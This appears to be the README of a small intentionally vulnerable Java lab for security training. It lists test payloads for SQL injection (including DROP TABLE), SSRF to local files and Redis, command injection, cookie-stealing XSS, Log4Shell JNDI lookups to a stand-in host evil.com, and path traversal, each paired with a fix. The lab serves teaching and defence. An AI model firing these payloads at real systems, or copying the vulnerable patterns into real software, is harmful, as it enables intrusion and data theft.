# Mini Java Vulnerability Lab

> 小型Java安全漏洞靶场 - 从 java-sec-code 提取的6种常见漏洞

## 🎯 漏洞列表

| 漏洞类型 | 描述 | CVE |
|---------|------|-----|
| SQL Injection | SQL注入漏洞 | - |
| SSRF | 服务端请求伪造 | - |
| Command Injection | 命令注入 | - |
| XSS | 跨站脚本攻击 | - |
| Log4Shell | Log4j2 JNDI注入 | CVE-2021-44228 |
| Path Traversal | 路径遍历 | - |

## 🚀 快速启动

### 前置要求
- Java 8+
- Maven 3.x
- MySQL 8.0+ (可选，用于SQL注入测试)

### 启动步骤

```bash
# 克隆项目
cd /opt/projects/benchmark/Qbenchmark

# 编译项目
mvn clean package

# 运行项目
java -jar target/mini-vuln-lab-1.0.0.jar

# 或直接使用Maven运行
mvn spring-boot:run
```

启动后访问: http://localhost:8080

## 📚 漏洞详情

### 1. SQL Injection (SQL注入)

**漏洞原理:** 直接拼接用户输入到SQL语句中

**测试Payload:**
```
# 基础SQL注入
/sqli/jdbc/vuln?username=admin' OR '1'='1

# LIKE子句注入
/sqli/like/vuln?username=admin%' OR '1'='1

# ORDER BY注入
/sqli/order/vuln?sort=id ASC; DROP TABLE users--
```

**修复方案:** 使用PreparedStatement参数化查询

---

### 2. SSRF (服务端请求伪造)

**漏洞原理:** 未验证用户输入的URL，可发起任意HTTP请求

**测试Payload:**
```
# 读取本地文件
/ssrf/urlconnection/vuln?url=file:///etc/passwd

# 内网端口扫描
/ssrf/httpurl/vuln?url=http://127.0.0.1:22

# Redis未授权访问
/ssrf/httpclient/vuln?url=gopher://127.0.0.1:6379/...
```

**修复方案:** URL白名单 + 内网IP黑名单

---

### 3. Command Injection (命令注入)

**漏洞原理:** 系统命令直接拼接用户输入

**测试Payload:**
```
# Unix命令注入
/cmd/runtime/vuln?filename=test.txt;cat /etc/passwd
/cmd/ping/vuln?host=8.8.8.8&&whoami

# Windows命令注入
/cmd/runtime/vuln?filename=test.txt&whoami
```

**修复方案:** 输入白名单验证 + 避免shell拼接

---

### 4. XSS (跨站脚本攻击)

**漏洞原理:** 未转义用户输入直接输出到页面

**测试Payload:**
```
# 反射型XSS
/xss/reflect?vuln=<script>alert(1)</script>
/xss/search?q=<img src=x onerror=alert(1)>

# 存储型XSS
/xss/stored/store?data=<script>alert(document.cookie)</script>
/xss/stored/show
```

**修复方案:** HTML实体编码 + CSP头

---

### 5. Log4Shell (Log4j2 RCE)

**漏洞原理:** Log4j2支持JNDI协议，可远程加载恶意类

**测试Payload:**
```
# 基础JNDI注入
/log4j/vuln?token=${jndi:ldap://evil.com/exp}

# 环境变量泄露
/log4j/vuln?token=${env:USER}
/log4j/vuln?token=${sys:java.version}

# WAF绕过
/log4j/bypass?payload=${${lower:j}ndi:ldap://evil.com/exp}
```

**修复方案:** 升级到Log4j 2.17.1+

---

### 6. Path Traversal (路径遍历)

**漏洞原理:** 未验证文件路径，可使用..访问任意文件

**测试Payload:**
```
# 基础路径遍历
/path/traversal/vuln?filename=../../../../../etc/passwd

# 绝对路径
/path/absolute/vuln?path=/etc/passwd

# URL编码绕过
/path/encode/vuln?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**修复方案:** 路径白名单 + 规范化验证

---

## 🛠️ 技术栈

- **Spring Boot 2.7.18** - Web框架
- **Log4j 2.14.1** - 日志组件(漏洞版本)
- **MySQL 8.0** - 数据库
- **Maven** - 构建工具

## 📄 项目结构

```
src/main/java/com/vulnlab/
├── VulnLabApplication.java      # 主程序入口
├── controller/
│   ├── IndexController.java      # 首页
│   ├── SQLInjectionController.java   # SQL注入
│   ├── SSRFController.java       # SSRF
│   ├── CommandInjectionController.java # 命令注入
│   ├── XSSController.java        # XSS
│   ├── Log4jController.java      # Log4Shell
│   └── PathTraversalController.java  # 路径遍历
└── util/
    ├── HttpUtil.java             # HTTP工具
    ├── CommandUtil.java          # 命令执行工具
    └── PathUtil.java             # 路径验证工具
```

## ⚠️ 免责声明

本项目仅用于**安全研究和教育目的**。请在合法授权的环境中使用，禁止用于任何非法用途。使用本代码产生的任何后果由使用者自行承担。

## 📝 参考

- [java-sec-code](https://github.com/JoyChou93/java-sec-code) - 原始项目
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
